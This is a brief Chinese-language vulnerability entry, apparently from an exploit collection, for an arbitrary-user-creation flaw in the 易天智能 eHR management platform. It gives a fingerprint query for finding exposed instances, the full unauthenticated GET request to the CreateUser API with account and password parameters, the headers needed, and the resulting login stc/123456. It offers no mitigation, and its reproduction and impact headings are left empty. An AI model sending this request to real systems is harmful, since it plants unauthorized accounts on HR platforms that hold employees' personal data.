# 易天智能eHR管理平台任意用户添加漏洞

- **系统**：易天智能eHR管理平台任意用户添加　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="易天智能eHR管理平台"`
- **请求**：`GET /BaseManage/UserAPI/CreateUser?Account=stc&Password=123456&OuterID=888 HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Priority: u=1`

**请求体 / payload**
```
stc/123456
```

**其他**
- 易天智能eHR管理平台任意用户添加漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 易天智能eHR管理平台